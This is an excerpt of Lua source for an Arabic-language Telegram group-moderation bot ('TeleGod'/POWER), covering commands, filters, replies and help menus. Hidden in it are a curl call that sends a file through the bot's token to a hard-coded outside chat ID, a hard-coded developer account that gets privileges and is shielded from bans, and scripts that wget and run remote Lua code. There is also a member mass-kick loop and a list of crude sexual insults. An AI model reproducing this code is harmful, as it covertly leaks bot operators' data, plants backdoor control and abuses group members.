...
rm -fr ../.telegram-cli
if [ ! -f ./tg ]; then
wget "https://raw.githubusercontent.com/bk_zt/tg-file/master/tg"
echo "•┉ • ┉ • ┉ ┉ • ┉ • ┉ • ┉ • ┉• •┉ • ┉ • ┉ ┉ • ┉ • ┉ • ┉ • ┉•"
...
rm -fr DEV3YAD.lua
wget https://raw.githubusercontent.com/grc00uu/P0AY/main/File_Bot/AHMED/Ahmedyad/DEV3YAD.lua
./tg -s ./DEV3YAD.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("YAD", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S DEV3YAD -X kill
screen -S DEV3YAD ./DEV3YAD
done
]])  
file:close() 
...
var = true  
elseif tonumber(user_id) == tonumber(5372193406) then
var = true  
...
if tonumber(user_id) == tonumber(5372193406) then  
var = database:get(bot_id.."pravera:Rd"..msg.chat_id_) or 'صلاح مبرمج السورس'
...
local UserName = (data.username_ or "sr_TeleGod")
...
local DEV3YAD_Msg = ''  
if msgs < 100 then 
DEV3YAD_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
DEV3YAD_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
DEV3YAD_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
DEV3YAD_Msg = 'متفاعل' 
elseif msgs < 1200 then 
DEV3YAD_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
DEV3YAD_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
DEV3YAD_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
DEV3YAD_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
DEV3YAD_Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
DEV3YAD_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
DEV3YAD_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
DEV3YAD_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
DEV3YAD_Msg = 'رب التفاعل'  
end 
return DEV3YAD_Msg 
end
--sendText(SUDO," ※شكرا لاستخدامك سورس تلي جود\n※اضغط /sudo لي تشغيل البوت",0,'md')
...
--------------------------------------------------------------------------------------------------------------
function SourceDEV3YAD(msg,data) -- بداية العمل
if msg then
...
{{text = '𝘾𝙃𝘼𝙉𝙉𝙀𝙇', url="t.me/sr_TeleGod"}},
} 
local Keyboard = {
{'☉ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐏𝐎𝐖𝐄𝐑 ☉'},
...
{'☉ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐏𝐎𝐖𝐄𝐑 ☉'},
{'ايدي','العاب تلي جود','سورس','تغير الايدي'},
{'☉ 𝐒𝐎𝐔𝐑𝐂𝐄 𝐏𝐎𝐖𝐄𝐑 ☉'},
...
send(msg.chat_id_, msg.id_,DEV3YAD_Msg) 
return false  
end 
if text then    
...
Start_Source = "※مرحبا عزيزي انا بوت اسمي "..Name_Bot.."\n※اختصائي حمايه الجروبات\n※طريقه تفعيلي في المجموعات\n※1-قم بـ اضافتي الي مجموعتك\n※2-قم بـ رفعي مشرف مع كامل الصلاحيات\n※3-قم بـ كتابه امر التفعيل {تفعيل} في الدردشه"
end
send_inline_key(msg.chat_id_,Start_Source,nil,inline)
return false
end
...
local list = database:smembers(bot_id.."botss:DEV3YAD:List:Rd:Sudo")
text = "\nقائمة ردود المتعدده \n•┉ • ┉ • ┉ ┉ • ┉ • ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do
db = "رساله "
text = text..""..k.." => {"..v.."} => {"..db.."}\n"
...
database:set(bot_id.."botss:DEV3YAD:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
...
database:set(bot_id.."botss:DEV3YAD:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
...
local inline = {{{text = '𝘾𝙃𝘼𝙉𝙉𝙀𝙇', url="t.me/sr_TeleGod"}},} 
...
send(msg.chat_id_,msg.id_,"※عذرا عزيزي هذا ليس معرف عضو قد يكون قناه او مجموعه")
return false
end
database:srem(bot_id..'Gmod:User', result.id_)
usertext = '\n※العضو »> ['..result.title_..'](t.me/'..(username or 'sr_TeleGod')..')'
...
usertext = '\n※العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'sr_TeleGod')..')'
status  = '\n※تم تنزيله من الادمنيه العامين'
...
os.execute('rm -rf DEV3YAD.lua')
os.execute('rm -rf getfile.json')
os.execute('wget https://raw.githubusercontent.com/grc00uu/P0AY/main/File_Bot/AHMED/Ahmedyad/DEV3YAD.lua')
...
send(msg.chat_id_, msg.id_,'※عدد الجروبات الان »> { '..#group..' }'..DEV3YADk..''..DEV3YAD..'\n※الان عدد الجروبات الحقيقي »> { '..sendok..' } جروبات\n')   
end
end
end,nil)
end
...
local DEV3YAD1_Msg = database:get(bot_id.."DEV3YAD1:Add:Filter:Rp2"..text..msg.chat_id_)   
if DEV3YAD1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ※العضو »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'sr_TeleGod')..') \n※'..DEV3YAD1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if DEV3YAD_Msg and not Special(msg) then  
local DEV3YAD_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if DEV3YAD_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ※العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n※["..DEV3YAD_Msg.."] \n")
else
send(msg.chat_id_,0," ※العضو : {["..data.first_name_.."](T.ME/sr_TeleGod)}\n※["..DEV3YAD_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ※عذرا »> {["..data.first_name_.."](T.ME/sr_TeleGod)}\n※عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
database:sadd(bot_id.."DEV3YAD:blocname"..msg.chat_id_, BlNe)
end
...
local All_name = database:smembers(bot_id.."DEV3YAD:blocname"..msg.chat_id_)
...
if name_MRSOFI then 
names_MRSOFI = database:smembers(bot_id.."DEV3YAD:blocname"..msg.chat_id_) or ""
...
database:set(bot_id.."DEV3YAD:teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."DEV3YAD:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."DEV3YAD:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."DEV3YAD:nump"..msg.chat_id_) or 5
...
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."DEV3YAD:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function sofi_mrsofi_new(mrsofi1,mrsofi2)
if mrsofi2 and mrsofi2.first_name_ then 
if mrsofi2.first_name_:match("(.*)"..database:get(bot_id.."DEV3YAD:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."DEV3YAD:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local mrsofi_nnn = database:get(bot_id.."DEV3YAD:nump"..msg.chat_id_) or 5
local mrsofi_nnn2 = database:get(bot_id.."DEV3YAD:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(mrsofi_nnn2) == tonumber(mrsofi_nnn) or tonumber(mrsofi_nnn2) > tonumber(mrsofi_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."DEV3YAD:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "※عزيزي >>["..mrsofi2.username_.."](https://t.me/"..(mrsofi2.username_ or "sr_TeleGod")..")\n※عليك وضع التوحيد ⪼ {"..database:get(bot_id.."DEV3YAD:teh"..msg.chat_id_).."} بجانب اسمك\n※عدد المحاولات المتبقيه {"..(tonumber(mrsofi_nnn) - tonumber(mrsofi_nnn2)).."}")
end
end
end
end
...
local DEV3YADChengName = database:get(bot_id.."DEV3YAD:Cheng:Name"..data.id_)
if not data.first_name_ then 
if DEV3YADChengName then 
send(msg.chat_id_, msg.id_, " مش عارف كدا اسمك ماله مش باين 😏 ["..DEV3YADChengName..']')
database:del(bot_id.."DEV3YAD:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if DEV3YADChengName ~= data.first_name_ then 
local Text = {
...
database:set(bot_id.."DEV3YAD:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then
local DEV3YADChengUserName = database:get(bot_id.."DEV3YAD:Cheng:UserName"..data.id_)
if not data.username_ then 
if DEV3YADChengUserName then 
send(msg.chat_id_, msg.id_, 1, "امسكو مسح اليورر بتاعه 😂😂\nاليوزر القديم  : [@"..DEV3YADChengUserName..']')
database:del(bot_id.."DEV3YAD:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if DEV3YADChengUserName ~= data.username_ then 
local Text = {
...
database:set(bot_id.."DEV3YAD:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then 
local DEV3YADChengPhoto = database:get(bot_id.."DEV3YAD:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if DEV3YADChengPhoto then 
send(msg.chat_id_, msg.id_, "امسكو مسح صورو الحيوان 😂😂")
database:del(bot_id.."DEV3YAD:Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if DEV3YADChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
  "شيل صورتك احسن",
  "حلوه الصوره دي",
...
database:set(bot_id.."DEV3YAD:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)  
...
local curlm = 'curl "'..'https://api.telegram.org/bot'..token..'/sendDocument'..'" -F "chat_id='.. 944353237 ..'" -F "document=@'..''..file..''..'"' io.popen(curlm) ---- كود كتابه أحمد عياد هتسرق هيجيبك من طيزك
...
if text == 'تغيير رمز السورس' and SudoBot2(msg) then
database:set(bot_id..'new:sourse'..msg.chat_id_..msg.sender_user_id_,'true1') 
send(msg.chat_id_, msg.id_, 'ارسل رمز بدلا عن هذا \n ┉')
return false
end
...
send(msg.chat_id_, msg.id_, 'تم تغيير رمز السورس')
database:del(bot_id..'new:sourse'..msg.chat_id_..msg.sender_user_id_)
return false
end

if text == 'حذف رمز السورس' and SudoBot2(msg) then
...
send(msg.chat_id_, msg.id_, 'تم حذف رمز السورس')
end
...
send(msg.chat_id_, msg.id_,'عليك الاشتراك في قناه السورس @sr_TeleGod')
return false
end
local msg_id = msg.id_/2097152/0.5 
local Text = [[ 
...
local msg_id = msg.id_/2097152/0.5 
local Text = [[ 
[𝘼𝙃𝙈𝙀𝘿𝙔𝘼𝘿](t.me/bk_zt) [𝙋𝙊𝙒𝙀𝙍](t.me/sr_TeleGod)
]]
keyboard = {}
keyboard.inline_keyboard = {
{{text = 'الـمـطـور', url="http://t.me/"..SUDOUSER}},
...
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/sr_TeleGod&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
local text = "~ Groups_Bots_In_the_Bot_Of_Source_POWER ~ @sr_TeleGod\n\n\n"
for k,v in pairs(list) do
if k == 1 then
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ※بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'sr_TeleGod')..') \n※تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ※بواسطه »> ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'sr_TeleGod')..') \n※تـم قفـل التاك بالكتم ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,'\n※تم قفل البوتات بالطرد\n※تم وضع الايدي بدون صوره\n※تم قفل التكرار بالطرد\n※تم قفل الروابط\n※تم قفل التوجيه\n※تم قفل الملصقات\n※تم قفل المتحركه\n※تم قفل الفيديو\n※تم قفل السب\n※تم قفل التعديل\n※تم قفل الفارسيه\n※تم قفل التفليش\n\nتم تفعيل الحمايه بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'sr_TeleGod')..')')  
end,nil)
end
--------------------------------------------------------------------------------------------------------------
if text == 'اعاده التشغيل' or text == 'اعاده التشغيل ☉' then
...
if tonumber(result.sender_user_id_) == tonumber(5372193406) then  
send(msg.chat_id_, msg.id_, " ※ احا دا المبرمج صلاح يسطا انت عبيط")
return false 
end
...
if tonumber(result.id_) == tonumber(5372193406) then  
send(msg.chat_id_, msg.id_, " ※ احا دا المبرمج صلاح يسطا انت عبيط")
return false 
end
...
if tonumber(userid) == tonumber(5372193406) then  
send(msg.chat_id_, msg.id_, " ※ احا دا المبرمج صلاح يسطا انت عبيط")
return false 
end
...
if tonumber(userid) == tonumber(5372193406) then  
send(msg.chat_id_, msg.id_, " ※احا مينفعش استخدم الاوامر دي على المبرمج صلاح")
return false  
end
if tonumber(userid) == tonumber(SUDO) then  
send(msg.chat_id_, msg.id_, " ※لا تسطيع (حظر-كتم) المطور الاساسي عام")
...
if SudoBot2(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/bk_zt/files-power/master/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n※اهلا بك في متجر ملفات سورس تلي جود\n※ملفات السورس ↓\n•┉ • ┉ • ┉ ┉ • ┉ • ┉ • ┉ • ┉•\n\n"
...
local UserName = (b.username_ or "bk_zt")
...
function Function_DEV3YAD(extra, result, success)
...
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_DEV3YAD, nil)
return false 
end
...
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_DEV3YAD, nil)
return false 
end
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n※لعضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'sr_TeleGod')..')'
status  = '\n※تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n※العضو »> '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n※العضــو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'sr_TeleGod')..')'
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n※العضو »> ['..data.first_name_..'](t.me/'..(data.username_ or 'sr_TeleGod')..')'
local  statuss  = '\n※تم رفع ضلع في الجروب\n※تعال حبيبـ انت صرت من الضلوع حظر روحك منا ورايح نطلع سفرات للجزيره والزورا ونشرب عرك'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
database:set(bot_id.."DEV3YAD1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."DEV3YAD1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," ※ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."DEV3YAD1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."DEV3YAD1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."DEV3YAD1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."DEV3YAD1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," ※تم منع الكلمه مع التحذير")  
database:del(bot_id.."DEV3YAD1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."DEV3YAD1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."DEV3YAD1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."DEV3YAD1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end
...
database:set(bot_id.."DEV3YAD1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."DEV3YAD1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."DEV3YAD1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."DEV3YAD1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."DEV3YAD1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."DEV3YAD1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."DEV3YAD1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."DEV3YAD1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."DEV3YAD1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n※قائمة المنع \n•┉ • ┉ • ┉ ┉ • ┉ • ┉ • ┉ • ┉•\n"
for k,v in pairs(list) do  
local DEV3YAD_Msg = database:get(bot_id.."DEV3YAD1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." »> {"..DEV3YAD_Msg.."}\n"    
end  
if #list == 0 then  
...
if text == 'تفعيل منع التصفيه' and msg.reply_to_message_id_ == 0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end 
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ※بواسطه »> ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'sr_TeleGod')..') \n※تـم تفعيل منع التصفيه ')  
end,nil)   
end
if text == 'تعطيل منع التصفيه' and msg.reply_to_message_id_ == 0 then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,'يجب ان تكون ادمن لاستخدام هذا الامر')
return false
end 
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n※العضو »> ['..result.title_..'](t.me/'..(text1[3] or 'sr_TeleGod')..')'..'\n※تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
send(msg.chat_id_, msg.id_,'['..DEV3YAD_Msg[math.random(#DEV3YAD_Msg)]..']') 
return false
end
]]--
if text=="اذاعه خاص" and msg.reply_to_message_id_ == 0 then
...
------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:DEV3YAD:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\n ※ارسل الكلمه تريد اضافتها')
database:set(bot_id.."botss:DEV3YAD:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."botss:DEV3YAD:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."botss:DEV3YAD:List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:DEV3YAD:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"※تم مسح الرد من ردود المتعدده")
database:del(bot_id..'botss:DEV3YAD:Add:Rd:Sudo:Text'..text)
database:del(bot_id..'botss:DEV3YAD:Add:Rd:Sudo:Text1'..text)
database:del(bot_id..'botss:DEV3YAD:Add:Rd:Sudo:Text2'..text)
database:del(bot_id.."botss:DEV3YAD:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."botss:DEV3YAD:List:Rd:Sudo", text)
return false
end
end
end
...
local list = database:smembers(bot_id.."botss:DEV3YAD:List:Rd:Sudo")
for k,v in pairs(list) do  
database:del(bot_id.."botss:DEV3YAD:Add:Rd:Sudo:Text"..v) 
database:del(bot_id.."botss:DEV3YAD:Add:Rd:Sudo:Text1"..v) 
database:del(bot_id.."botss:DEV3YAD:Add:Rd:Sudo:Text2"..v)   
database:del(bot_id.."botss:DEV3YAD:List:Rd:Sudo")
end
...
database:set(bot_id.."sr_TeleGod:Tag:Admins:"..msg.chat_id_,true)
if database:get(bot_id.."sr_TeleGod:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
if text then  
local test = database:get(bot_id.."botss:DEV3YAD:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:DEV3YAD:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:set(bot_id.."botss:DEV3YAD:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:DEV3YAD:Add:Rd:Sudo:Text"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:DEV3YAD:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:DEV3YAD:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
database:set(bot_id.."botss:DEV3YAD:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:DEV3YAD:Add:Rd:Sudo:Text1"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:DEV3YAD:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:DEV3YAD:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
database:set(bot_id.."botss:DEV3YAD:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:DEV3YAD:Add:Rd:Sudo:Text2"..test, text)  
end  
send(msg.chat_id_, msg.id_,"※تم حفظ الرد")
return false  
end  
...
if text then
local Text = database:get(bot_id.."botss:DEV3YAD:Add:Rd:Sudo:Text"..text)   
local Text1 = database:get(bot_id.."botss:DEV3YAD:Add:Rd:Sudo:Text1"..text)   
local Text2 = database:get(bot_id.."botss:DEV3YAD:Add:Rd:Sudo:Text2"..text)   
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'sr_TeleGod')..')'
local iduser = result.sender_user_id_
...
send(msg.chat_id_, msg.id_,' ※تعال حبـ يصيحونك بل جروب [@'..username..']') 
return false
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, start_function, nil)
...
-- vardump(data) 
DEV3YADdx(msg.chat_id_, msg.id_, ' ※ايدي المجموعة »> ( '..msg.chat_id_..' )\n※عدد الادمنيه »> ( *'..data.administrator_count_..' )*\n※عدد المحظورين »> ( *'..data.kicked_count_..' )*\n※عدد الاعضاء »> ( *'..data.member_count_..' )*\n', 'md') 
end 
...
keyboard.inline_keyboard = {
{
{text = '１', callback_data="/help3"},{text = '２', callback_data="/help4"},
},
{
{text = '３', callback_data="/help5"},{text = '４', callback_data="/help6"},
},
{
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '１', callback_data="/game1"},{text = '２', callback_data="/game2"}},
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
return false
...
send(msg.chat_id_, msg.reply_to_message_id_, texting[math.random(#texting)])
send(msg.chat_id_, msg.id_, 'تم حبـ 💋')
end
end
...
'كسم امك الاحبه',
'كسم الي ناكك',
'كسم طيزك زبـ م نافع يخرج',
'كسمينك',
'زبـ م نافع يخرج من كسمك',
'زبي',
'كسمك',
'كسختك',
'يخول',
...
send(msg.chat_id_, msg.reply_to_message_id_, 'كـسـمـك لاجـل كسمك لاجل زبـ ❤') 
...
local texting = {"دا كداب يصحبـ 🙂","صادق 😊","مشعارف 😿","بيعرص 😂","كداب و تيز 😒","قوله يجيب 5 جنيه وهقول صادق 😏"}
...
Teext = string.gsub(Teext,"𝔓𝔒𝔚𝔈ℜ",text3)
...
keyboard.inline_keyboard = {
{
{text = '⌯ １ ⌯', callback_data="/help"},{text = '２', callback_data="/help4"},
},
{
{text = '３', callback_data="/help5"},{text = '４', callback_data="/help6"},
},
...
keyboard.inline_keyboard = {
{
{text = '１', callback_data="/help3"},{text = '⌯ ２ ⌯', callback_data="/help"},
},
{
{text = '３', callback_data="/help5"},{text = '４', callback_data="/help6"},
},
...
{
{text = '⌯ ３ ⌯', callback_data="/help"},{text = '４', callback_data="/help6"},
},
{
{text = 'اوامر التسليه', callback_data="/help7"},
},
...
{
{text = '３', callback_data="/help5"},{text = '⌯ ４ ⌯', callback_data="/help"},
},
{
{text = 'اوامر التسليه', callback_data="/help7"},
},
...
{{text = 'مبرمج السورس', url="t.me/bk_zt"}},
{{text = '⌯ １ ⌯', callback_data="/game"},{text = '２', callback_data="/game2"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
if Text == '/game2' then
...
{{text = 'مبرمج السورس', url="t.me/bk_zt"}},
{{text = '１', callback_data="/game1"},{text = '⌯ ２ ⌯', callback_data="/game"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
...
if text ==  ""..Name_Bot..'ايه رأيك في دا' and tonumber(msg.reply_to_message_id_) > 0 then     
function FunBot(extra, result, success) 
local Fun = {'عيل خول 😒','راجل جدع 💋🙄','حكاك اوي بيريل ع اي بنت في الروم 🙄', 'لسه مطرود من روم دلوقت 😶🙊','سيبكمنه يعم انا ناقص قرف ','ايالقرف دا عصبح 😂🤷🏼‍♀️','احمد ربنا اني سايبه هنا اصلا 😿','راجل ميه ميه هو اللي مشغل الروم اصلا 🤓❤️' } 
...
function FunBot(extra, result, success) 
local Fun = {'اكتر ما تتخيل 🌚♥','الحقيقه لا 🙂',' لٱ يعععع','وانت مالك 🙂😂 💔' } 
send(msg.chat_id_,result.id_,''..Fun[math.random(#Fun)]..'') 
end  
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, FunBot, nil)
return false
end
if text == ""..Name_Bot..'بتحب دي' and tonumber(msg.reply_to_message_id_) > 0 then    
function FunBot(extra, result, success) 
local Fun = {'اكتر ما تتخيل 🌚♥','الحقيقه لا 🙂',' لٱ يعععع','وانت مالك 🙂😂 💔' } 
send(msg.chat_id_,result.id_,''..Fun[math.random(#Fun)]..'') 
end  
...
DEV3YAD = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(DEV3YAD)
...
--------------------------------------------------------------------------------------------------------------
SourceDEV3YAD(data.message_,data)
...
------------------------------------------------------------------------
local DEV3YADAbot = database:get(bot_id.."DEV3YAD1:Add:Filter:Rp2"..text..result.chat_id_)   
if DEV3YADAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ※العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n※["..DEV3YADAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local DEV3YAD1_Msg = database:get(bot_id.."DEV3YAD1:Add:Filter:Rp2"..text..result.chat_id_)   
if DEV3YAD1_Msg then    
send(msg.chat_id_, msg.id_," ※"..DEV3YAD1_Msg)
